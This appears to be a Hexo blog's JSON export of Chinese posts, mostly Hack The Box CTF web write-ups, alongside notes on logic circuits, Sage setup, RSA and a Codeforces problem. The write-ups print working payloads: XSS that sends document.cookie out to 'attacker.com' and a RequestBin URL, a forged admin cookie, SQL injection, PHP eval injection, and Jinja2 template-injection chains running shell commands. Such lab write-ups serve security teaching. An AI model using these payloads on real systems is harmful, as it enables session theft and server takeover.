{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":null,"url":"https://archer-baiyi.github.io","root":"/"},"pages":[{"title":"","date":"2025-03-28T23:35:22.524Z","updated":"2025-03-28T23:33:52.530Z","comments":true,"path":"googlecbf54c20e5418f2c.html","permalink":"https://archer-baiyi.github.io/googlecbf54c20e5418f2c.html","excerpt":"","text":"google-site-verification: googlecbf54c20e5418f2c.html"},{"title":"友链","date":"2025-03-09T23:52:24.022Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"https://archer-baiyi.github.io/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"https://archer-baiyi.github.io/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"https://archer-baiyi.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2025-03-03T17:50:25.350Z","updated":"2025-03-03T17:50:25.350Z","comments":true,"path":"about/index.html","permalink":"https://archer-baiyi.github.io/about/index.html","excerpt":"","text":"CTF萌新"}],"posts":[{"title":"HTB Phantom Script","slug":"CTF/Web/HTB-Phantom-Script","date":"2025-04-02T11:56:01.000Z","updated":"2025-04-02T12:08:27.141Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Phantom-Script/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Phantom-Script/","excerpt":"","text":"题目描述 （有附件，但完全不需要。） 观察打开网页： 注意右边的这段代码： 123456789101112searchInput.addEventListener(&#x27;input&#x27;, function () &#123; const query = searchInput.value; if (query.trim() !== &quot;&quot;) &#123; const filteredArticles = filterArticles(query); searchResultsHeading.innerHTML = `Results for: &quot;$&#123;query&#125;&quot;`; searchResultsHeading.style.display = &#x27;block&#x27;; renderArticles(filteredArticles); &#125; else &#123; searchResultsHeading.style.display = &#x27;none&#x27;; renderArticles(articles); &#125;&#125;); 这里会直接提取我们的输入赋值给 query，并且将query直接拼接进HTML的代码里了。 网页右下角那里还给了些基础xss的例子： 但是尝试 1&lt;script&gt;alert(&#x27;Boo!&#x27;);&lt;/script&gt; 会失败，有可能是那里自动过滤了。 渗透尝试其他Payload即可： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 检测到注入成功了便会自动显示flag。 得到flag：HTB{xS5_iS_34SY_wh4t_d0_you_th1nk?} 。 讲一下这里注入成功的原理： 这是我们注入的内容： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 当我们在html里写 1&lt;img src=&quot;valid_image.jpg&quot;&gt; 的时候浏览器会自动去加载图片。但是我们这里故意写了个无效的地址1&lt;img src=x&gt; 所以加载时会触发error，然后 onerror 里的内容会被当作 JavaScript 执行。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB OnlyHacks","slug":"CTF/Web/HTB-OnlyHacks","date":"2025-04-02T07:38:35.000Z","updated":"2025-04-02T11:05:02.462Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-OnlyHacks/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-OnlyHacks/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 注册个账号试试：（注意这里一定要上传一个头像，不然会一直提示用户名重复） 进去之后会显示4个人，我们每个都点一下绿色的心（在dating app里应该是心动的意思）： 然后点进右上角的Mathces： 会发现只有一个对话框。 对话里没有什么有用的信息，但是我们注意到它好像是每隔一段时间（大概5到10秒左右）才会看一次我们的消息并回复，跟一般XSS的环境很像。 我们查看当前的cookie会发现： 通过base64解码会发现这个应该是通过cookie识别我们登录的身份的。（后面的乱码部分是python的flask的session自带的签名） 渗透通过XSS获取管理员身份并登录他的账号。 首先在 https://requestbin.kanbanbox.com/ 上创建一个RequestBin： 正常XSS攻击的模板是： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 所以我们将我们在RequestBin创建的url放进去然后在聊天框发送： 1&lt;script&gt;fetch(&quot;https://requestbin.kanbanbox.com/xckrydxc?cookie=&quot; + document.cookie); &lt;/script&gt; 之后在RequestBin页面点击右上角的青色图标那里： 就可以查看收到的cookie内容： 1eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-0WhA.5nThwcWkf-HP8ql-gF68E3RTUjE 之后在浏览器里修改我们的cookie再刷新网页： 可以看到我们成功登录了她的账号，还能看到我们刚才发送的消息。 flag就在另一个对话里：HTB{d0nt_trust_str4ng3r5_bl1ndly} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"}]},{"title":"逻辑电路图","slug":"TUM笔记/ERA/逻辑电路图","date":"2025-03-31T20:35:54.000Z","updated":"2025-04-01T17:48:45.056Z","comments":true,"path":"2025/03/31/TUM笔记/ERA/逻辑电路图/","permalink":"https://archer-baiyi.github.io/2025/03/31/TUM%E7%AC%94%E8%AE%B0/ERA/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/","excerpt":"","text":"逻辑门先来认识（记）一下基础的逻辑门： 注意，NAND，NOR那里的那个小圆圈代表的是取反（negation），跟最底下的Negation是一个效果。 比如这里表达的是 $y = \\neg (a \\wedge \\neg b) $ ： 一般情况下堵在逻辑门出入口的圆圈指的是取反，而下面这种只是表示线路连接而已： 不要弄混了。 加法（Addition）半加器（Der Halbaddierer ，HA）半加器的目的是计算2个bit的加法，输出也为2个bit，即： 1234 a0+ b0------s1 s0 也可以用数学公式表达： \\begin{align*} ha: B^2 &\\to B^2 \\\\ (a_0,b_0) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0 \\end{align*}对应的真值表则是： \\begin{array}{cc|cc} a_0 & b_0 & s_1 & s_0 \\\\ \\hline 0 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 1 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 1 & 0 \\\\ \\end{array}也就是说 s_0 = a_0 \\text{ xor } b_0\\\\ s_1 = a_0 \\wedge b_0对应的逻辑电路图： 左边是and，右边是xor。在之后的内容里用HA指代半加器。 Kosten和Tiefe分别是：C(HA) = 2, Depth(HA) = 1。 全加器（Der Volladdierer ，FA）全加器的目的是计算3个bit的加法，输出为2个bit，即： 12345 a0+ b0+ c------s1 s0 其中c是进位信息。 对应的数学表达： \\begin{align*} fa: B^3 &\\to B^2 \\\\ (a_0,b_0,c) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0+c \\end{align*}真值表： \\begin{array}{ccc|cc} a_0 & b_0 & c & fa_1 & fa_0 \\\\ \\hline 0 & 0 & 0 & 0 & 0 \\\\ 0 & 0 & 1 & 0 & 1 \\\\ 0 & 1 & 0 & 0 & 1 \\\\ 0 & 1 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 0 & 1 \\\\ 1 & 0 & 1 & 1 & 0 \\\\ 1 & 1 & 0 & 1 & 0 \\\\ 1 & 1 & 1 & 1 & 1 \\\\ \\end{array}注意到： s_0 = a_0 \\text{ xor } b_0 \\text{ xor } c = a_0(c,ha_0(a_0,b_0))\\\\ \\begin{align*} s_1 &= a_0 \\wedge b_0 \\vee c \\wedge (a_0 \\text{ xor } b_0 )\\\\ &= ha_1(a_0,b_0) + ha_1(c,ha_0(a_0,b_0)) \\end{align*}（ha0表示2个数相加得到的s0位的值，ha1同理。） 逻辑电路图： Kosten和Tiefe分别是：C(HA) = 5, Depth(HA) = 3。 选择器（Multiplexer，MUX）选择器正如字面意思，会从2个数里选择一个数。数学表达： \\begin{align*}sel_n: B^{2n+} &\\to B^{n} \\\\ (a_{n-1}, \\ldots, a_0, b_{n-1}, \\ldots, b_0, s) &\\mapsto \\begin{cases} (a_{n-1} \\ldots a_0), & \\text{falls } s = 1 \\\\ (b_{n-1} \\ldots b_0), & \\text{falls } s = 0 \\end{cases} \\end{align*}注意到： (sel_n)_i = (s \\wedge a_i) \\vee (\\neg s \\wedge b_i)逻辑电路图： 后续一般用这个符号指代： 存储（Speichern）RS-Latch 真值表： \\begin{array}{cc|cc} R & S & Q(t) & \\neg Q(t) \\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) \\\\ 0 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 0 & 0 \\\\ \\end{array}D-Latch （设上面 and 的结果为S，下面 and 的结果为R，跟RS-Latch的位置一样。） 真值表： \\begin{array}{cc|cc|cc} D & E & Q(t) & \\neg Q(t) & R & S\\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 0 & 1 & 0 & 1 & 1 & 0\\\\ 1 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 1 & 1 & 1 & 0 & 0 & 1\\\\ \\end{array}2*2 Bit Speicher （write位等于0代表读，等于1代表写；灰色的是选择器；上面的2个黄色部分是Adresse=0的结果，下面的是Adresse=1的。） Inkrementer自增器主要用于比如说更新程序计数器（Program counter），需要到达的效果类似： 1add pc, pc, 4 需要2个步骤，计算加法并且存储结果。所以对应的逻辑电路为：","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"}]},{"title":"如何在wsl里安装sage","slug":"CTF/如何在wsl里安装sage","date":"2025-03-31T12:44:34.000Z","updated":"2025-04-01T22:01:41.291Z","comments":true,"path":"2025/03/31/CTF/如何在wsl里安装sage/","permalink":"https://archer-baiyi.github.io/2025/03/31/CTF/%E5%A6%82%E4%BD%95%E5%9C%A8wsl%E9%87%8C%E5%AE%89%E8%A3%85sage/","excerpt":"","text":"一共分成2个步骤： 安装Miniforge（Anaconda的轻量化替代品） 通过Anaconda安装sage 下载vscode的wsl版（可选） 安装Miniforge1wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-x86_64.sh 然后安装脚本： 1bash Miniforge3-Linux-x86_64.sh 如果安装时询问你是否要把它加入 .bashrc， 选择是，这样一来每次打开wsl它都会自动启动并进入base环境，会比较方便。 当然如果这个自启没有设置成功，也可以手动设置： 先打开 .bashrc 编辑器 1nano ~/.bashrc 在文件末尾添加： 12. &quot;$HOME/miniforge3/etc/profile.d/conda.sh&quot;conda activate base 然后使用 Ctrl + o 和 Ctrl + x 保存并退出。 最后再运行： 1source ~/.bashrc 安装sage通过 1conda create -n sage sage -c conda-forge 安装sage。然后每次使用 1conda activate sage 激活sage环境并用 1sage 打开sage。 下载vscode的wsl版由于单纯用命令行运行sage代码不太方便，并且只用sage的话有些python的命令（比如说连接服务器等）容易出问题，可以安装一个vscode的wsl版。 首先在Windows里的vscode下载 wsl 的插件 之后在当前wsl的命令行里输入： 12code .# 用vscode打开当前文件夹 它便会开始自动下载wsl版的vscode。 下载完成后，每次启动wsl之后只需要先打开vscode： 1code . 然后在vscode的命令行里输入： 1conda activate sage 便可以编写并运行import了sage库的python代码。 记住要先开vscode再开启sage的环境，不然先开启了sage环境后，进到vscode里会掉回base的环境！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"}],"tags":[{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"}]},{"title":"HTB Full Stack Conf","slug":"CTF/Web/HTB-Full-Stack-Conf","date":"2025-03-30T10:40:40.000Z","updated":"2025-03-30T10:44:45.198Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-Full-Stack-Conf/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-Full-Stack-Conf/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 渗透因为提示用alert，并且题目描述里提到了JavaScript，所以直接尝试最简单的JavaScript注入： 1&lt;script&gt;alert(&#x27;1&#x27;);&lt;/script&gt; 得到flag：HTB{p0p..p0p..p0p...alert(1337)} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB baby auth","slug":"CTF/Web/HTB-baby-auth","date":"2025-03-30T10:24:26.000Z","updated":"2025-03-30T10:31:28.231Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-baby-auth/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-baby-auth/","excerpt":"","text":"题目描述 （无附件） 观察打开网站： 注册个账号然后登录试试： 查看当前cookie： 这段内容base64解码可以得到： 123eyJ1c2VybmFtZSI6IjEyMyJ9&#123;&quot;username&quot;:&quot;123&quot;&#125; 渗透将cookie改成 1&#123;&quot;username&quot;:&quot;admin&quot;&#125; 的base64，即 1eyJ1c2VybmFtZSI6ImFkbWluIn0= 修改cookie然后刷新网页： 得到flag：HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"}]},{"title":"RSA加解密以及破解方法","slug":"CTF/Crypto/RSA加解密以及破解方法","date":"2025-03-29T19:01:56.000Z","updated":"2025-03-29T20:39:16.023Z","comments":true,"path":"2025/03/29/CTF/Crypto/RSA加解密以及破解方法/","permalink":"https://archer-baiyi.github.io/2025/03/29/CTF/Crypto/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95/","excerpt":"","text":"RSA加/解密首先设 \\varphi(m) := | \\{ 1 \\leq k \\leq m ｜\\gcd(k, m) = 1 \\} |为欧拉函数（Euler’sche Phi-function）。 RSA加密算法的初始化流程如下： 选择2个很大的质数$p, q$. 计算$n:=pq$。这里的n是公开的，$p, q$则是保密的。 计算$\\varphi(n)$。（因为我们知道$n=pq$，且$p, q$均为质数，我们可以利用公式$\\varphi(n)=(p-1)(q-1)$进行快速计算。） 选择$e \\in \\{1,2,…,\\varphi(n)-1\\}$，使得$gcd(\\varphi(n),e)=1$. 我们的公钥为$(e,n)$。 计算密钥$d$，满足$ed \\equiv 1$ mod $\\varphi(n)$. 公钥：$n, e$ 私钥：$d$ 假设明文内容为$c$，加密： b=a^e \\text{ mod } n, \\ \\ \\ \\ a,b \\in \\mathbb{Z}_n.解密： a=b^d \\text{ mod } n.如此一来，任何人都可以将一段信息加密后发送给我们，而只有我们能够解密这段信息。 在进行第5步计算密钥$d$时，可以考虑以下算法： 用扩展欧几里得算法找到 $x$ 和 $y$，使得： e \\cdot x + \\varphi(n) \\cdot y = 1, 上式中，$x$ 模 $\\varphi(n)$ 的值即为 $d$： d \\equiv x \\bmod \\varphi(n).如果 $d &lt; 0$，需要将其调整到正数范围： d = d + \\phi(n). 代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes # 将string转换成大整数from math import gcddef modinv(e, phi): # 扩展欧几里得算法计算模逆 def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) x, _ = extended_gcd(e, phi) return x % phip = getPrime(512) # 512位的素数q = getPrime(512) # 512位的素数n = p * qphi = (p - 1) * (q - 1)e = 65537 # 大部分默认使用这个e的值assert gcd(e, phi) == 1d = modinv(e, phi)# 加密def encrypt(message, e, n): m = bytes_to_long(message.encode()) c = pow(m, e, n) return c# 解密def decrypt(cipher_int, d, n): m = pow(cipher_int, d, n) message = long_to_bytes(m).decode() return messagemsg = &quot;Hello World!&quot;cipher = encrypt(msg, e, n)decrypted = decrypt(cipher, d, n) 攻击质因数分解nFermat’s Factorization这种方法适用于p和q的大小差不多的情况。 Pollard’s p-1Wiener’s Attack这种方法适用于d特别小的情况。（当给的e非常大的时候都可以试一下这种方法）","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"}]},{"title":"HTB Art","slug":"CTF/Misc/HTB-Art","date":"2025-03-28T22:46:02.000Z","updated":"2025-03-28T22:53:49.272Z","comments":true,"path":"2025/03/28/CTF/Misc/HTB-Art/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Misc/HTB-Art/","excerpt":"","text":"题目描述 会拿到一张这样的图片： 题解这是Piet，一种esolang（esoteric programming language）。（详见https://en.wikipedia.org/wiki/Esoteric_programming_language#Piet） 这道题就是很典型的“知道就很简单，不知道就完全没法做”。 可以用这个网站在线运行： https://www.bertnase.de/npiet/npiet-execute.php 然后得到flag：HTB{p137_m0ndr14n}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"}]},{"title":"HTB-sanitize","slug":"CTF/Web/HTB-sanitize","date":"2025-03-28T19:12:23.000Z","updated":"2025-03-28T19:22:00.301Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-sanitize/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-sanitize/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 随便输入个username和password会看到下方有一段SQL代码： 渗透猜测网页的登录逻辑是这样的：如果当前select成功（也就是说能在数据库里找到当前输入的账号信息），那么就可以登录成功。 所以直接SQL Injection，在username一栏输入 1admin&#x27; -- ，然后password那一栏输入任意内容（比如说1），就可以得到flag：HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"}]},{"title":"HTB-LoveTok","slug":"CTF/Web/HTB-LoveTok","date":"2025-03-28T10:30:49.000Z","updated":"2025-03-28T19:21:55.415Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-LoveTok/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-LoveTok/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 当点击了下面那个按钮之后网页的url会增加一个参数： 1/?format=r 因为给的附件比较多，所以直接挨个搜索“format”，可以确定下来2份相关代码： 12345678910&lt;?phpclass TimeController&#123; public function index($router) &#123; $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;r&#x27;; $time = new TimeModel($format); return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]); &#125;&#125; 这里会直接接收（没有过滤）我们传入的 format 的值，然后调用 TimeModel 处理这个值。 123456789101112131415161718&lt;?phpclass TimeModel&#123; public function __construct($format) &#123; $this-&gt;format = addslashes($format); # 把用户输入的 format 做了 addslashes() 处理，会把 &quot;, &#x27;, \\, NULL 这些内容前面加上反斜杠进行转义。 [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;; &#125; public function getTime() &#123; eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;); return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;; &#125;&#125; 注意，PHP 的 eval() 函数会把传入的字符串当作 PHP 代码来执行。所以这道题可以通过注入php代码（不能包含 %}，{% kbd ' %}，{% kbd %}，{% kbd NULL %}）来获取flag。 首先尝试 1/?format=$&#123;system(ls)&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"}]},{"title":"Codeforce Dragons","slug":"算法竞赛/Codeforce/1000/Codeforce-Dragons","date":"2025-03-28T10:15:13.000Z","updated":"2025-04-02T11:06:13.363Z","comments":true,"path":"2025/03/28/算法竞赛/Codeforce/1000/Codeforce-Dragons/","permalink":"https://archer-baiyi.github.io/2025/03/28/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Dragons/","excerpt":"","text":"题目描述 思路这道题的重点是可以自由挑选打龙的顺序，所以可以用vector来存储所有x，y的值，然后进行排序。 代码C++1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for sortusing namespace std;int main() { int s, n; cin &gt;&gt; s &gt;&gt; n; vector&lt;pair&lt;int, int&gt;&gt; dragons(n); // 每条龙是一个(x, y)的vector for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; dragons[i].first &gt;&gt; dragons[i].second; // first 是 x，second 是 y } // 按照龙的强度从小到大排序 // 默认先按照 pair 的 first 升序排列。如果 first 相等，再按照 second 升序排列 // begin和end会对所有内容进行排序。 sort(dragons.begin(), dragons.end()); for (int i = 0; i &lt; n; ++i) { if (s &gt; dragons[i].first) { s += dragons[i].second; // 赢了，加数值的奖励 } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; return 0; } } cout &lt;&lt; \"YES\" &lt;&lt; endl; return 0;} 如果是降序的话需要写成 123sort(dragons.begin(), dragons.end(), [](pair&lt;int, int&gt; a, pair&lt;int, int&gt; b) { return a.first &gt; b.first;});","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"}]},{"title":"HTB Templated","slug":"CTF/Web/HTB-Templated","date":"2025-03-27T20:02:53.000Z","updated":"2025-03-27T20:55:06.020Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Templated/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Templated/","excerpt":"","text":"题目描述 （无附件） 观察打开网站会发现一片空白： 专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为 1{{ code }} （以下用server来指代当前网址） 因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成 1server/{{7*7}} 时，会显示 可以看到 7*7 确实被执行了，所以确定这里就是注入口。 渗透有至少2种方法： 第一种通过模板中函数对象的 __globals__ 拿到全局作用域，然后借助 ____builtins__[__import__]__ 导入 os ，用 os.popen() 执行命令。 核心链路： 1234567891011self↓__init__ ← 模板函数对象↓__globals__ ← 函数的全局变量字典↓__builtins__['__import__'] ← 导入函数↓__import__('os') ← 导入 os 模块↓os.popen('命令').read() ← 执行命令并读取结果 按以下顺序注入： 1{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 或 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 确认了当前注入方式可行。 然后查找 flag 文件： 1{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} 最后直接读取flag： 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }} 第二种使用这个模板来发起命令执行（RCE）攻击： 1{{ [].__class__.__base__.__subclasses__()[&lt;index&gt;].__init__.__globals__['os'].popen('id').read() }} （需要找到popen对应的index） 首先用 1{{ [].__class__.__base__.__subclasses__() }} 列出所有 subclasses，然后通过 12345{% for c in [].__class__.__base__.__subclasses__() %} {% if 'Popen' in c.__name__ %} {{ loop.index0 }}: {{ c }} {% endif %}{% endfor %} 找到 popen 的index： 通过尝试 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('id').read() }} 确认可以成功RCE。 接着就跟之前一样先找然后再读取flag： 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('ls').read() }} 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('cat flag.txt').read() }} 拿到flag：HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} 